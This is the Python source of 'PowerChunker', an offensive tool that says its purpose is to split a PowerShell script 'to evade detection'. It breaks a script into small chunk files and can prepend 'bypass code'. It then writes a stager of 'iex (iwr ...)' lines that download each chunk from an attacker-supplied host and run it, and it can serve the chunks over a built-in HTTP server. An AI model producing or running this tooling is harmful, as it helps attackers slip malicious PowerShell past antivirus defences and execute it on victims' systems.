#!/usr/bin/env python3
import http.server
import socketserver
import argparse
import sys
import secrets
import string

inspiration = """
/\\     __    PowerChunker.py!!!
  \\ .-':::.         (by @icyguider)
   \\ :::::|\\
  |,\\:::'/  \\     why is there hamburger?
  `.:::-'    \\
    `-.       \\         ___
       `-.     |     .-'';:::.
          `-.-'     / ',''.;;;\\
                   |  ','','.''|
              AsH  |\\  ' ,',' /'
                   `.`-.___.-;'
                     `--._.-'
"""


def generate_name(alphabet, length=12, exclude=None):
    if exclude is None:
        exclude = []
    name = "".join(secrets.choice(alphabet) for i in range(length))
    while name in exclude:
        name = "".join(secrets.choice(alphabet) for i in range(length))
    return name


def main(filename, host, outdir, bypass, stagername, serve, randomize, timeout):
    alphabet = string.ascii_letters + string.digits
    sample = []
    # Prepend bypass code if specified
    if bypass is not None:
        with open(bypass, "r") as f:
            sample.extend(f.readlines())

    # Read in powershell script
    with open(filename, "r") as f:
        sample.extend(f.readlines())

    # Remove extra spaces from lines
    sample = [x.strip() for x in sample]

    # Remove comments and blank lines from ps1 script
    sample = [x for x in sample if x != "" and not x.startswith("#")]

    real = []
    multiline = False

    count = 1
    names = []
    for line in sample:
        # line = line.strip("\n")
        if '@"' in line:
            multiline = True
        if '"@' in line:
            real.append(line)
            multiline = False
            done = "\n".join(real)
            real.clear()
            if randomize:
                name = generate_name(alphabet=alphabet, exclude=names)
                names.append(name)
            else:
                name = count
            with open("{}{}.ps1".format(outdir, name), "w+") as f:
                f.write(done)
            count += 1
        if multiline == True:
            real.append(line)
        else:
            if '"@' not in line:
                if randomize:
                    name = generate_name(alphabet=alphabet, exclude=names)
                    names.append(name)
                else:
                    name = count
                with open("{}{}.ps1".format(outdir, name), "w+") as f:
                    f.write(line)
                count += 1

    print("[+] Powershell script has been split into {} files...".format(count - 1))

    stager = []
    for x in names if randomize else range(1, count):
        if timeout > 0:
            stager.append(
                "iex (iwr -UseBasicParsing -TimeoutSec {} {}/{}.ps1)\n".format(
                    timeout, host, x
                )
            )
        else:
            stager.append("iex (iwr -UseBasicParsing {}/{}.ps1)\n".format(host, x))

    with open("{}{}".format(outdir, stagername), "w+") as f:
        f.write("".join(stager))

    if timeout > 0:
        print(
            "[!] PowerChunker Stager written to: {}{}\n    Execute like so: iex (iwr -UseBasicParsing -TimeoutSec {} {}/{})".format(
                outdir, stagername, timeout, host, stagername
            )
        )
    else:
        print(
            "[!] PowerChunker Stager written to: {}{}\n    Execute like so: iex (iwr -UseBasicParsing {}/{})".format(
                outdir, stagername, host, stagername
            )
        )

    if serve is True:
        PORT = 9080
        Handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", PORT), Handler) as httpd:
            print("[+] Serving at port:", PORT)
            httpd.serve_forever()


print(inspiration)
parser = argparse.ArgumentParser(
    description="Split a powershell script to evade detection!"
)
parser.add_argument("file", help="Name of powershell script to chunk", type=str)
parser.add_argument(
    "host",
    help="Domain Name or IP Address of host that will serve stager, with scheme",
    type=str,
)
parser.add_argument(
    "-d",
    "--dir",
    dest="dir",
    help="Directory to write results to (Optional)",
    default="./",
)
parser.add_argument(
    "-s",
    "--serve",
    dest="serve",
    help="Start HTTP Server to host stager (Optional)",
    default=False,
    action="store_true",
)
parser.add_argument(
    "-o",
    "--out",
    dest="out",
    help="Name of final stager (Optional)",
    metavar="stager.ps1",
    default="chunker.ps1",
)
parser.add_argument(
    "-b",
    "--bypass",
    dest="bypass",
    help="Prepend bypass code from file (Optional)",
    metavar="bypass.ps1",
)
parser.add_argument(
    "-r",
    "--random",
    dest="random",
    help="Randomize output filenames (except final stager)",
    action="store_true",
)
parser.add_argument(
    "-t",
    "--timeout",
    dest="timeout",
    help="Timeout for requests (Optional)",
    default=0,
    type=int,
)

if len(sys.argv) < 3:
    parser.print_help()
    sys.exit()
args = parser.parse_args()
if not args.dir.endswith("/"):
    args.dir += "/"
assert args.host.startswith("http"), "Host must contain scheme  (like http://)"
try:
    if len(sys.argv) > 3:
        if args.file is None or args.host is None or args.serve is None:
            raise Exception()
        else:
            main(
                args.file,
                args.host,
                args.dir,
                args.bypass,
                args.out,
                args.serve,
                args.random,
                args.timeout,
            )
    else:
        main(
            args.file,
            args.host,
            args.dir,
            args.bypass,
            args.out,
            args.serve,
            args.random,
            args.timeout,
        )
except:
    sys.exit()
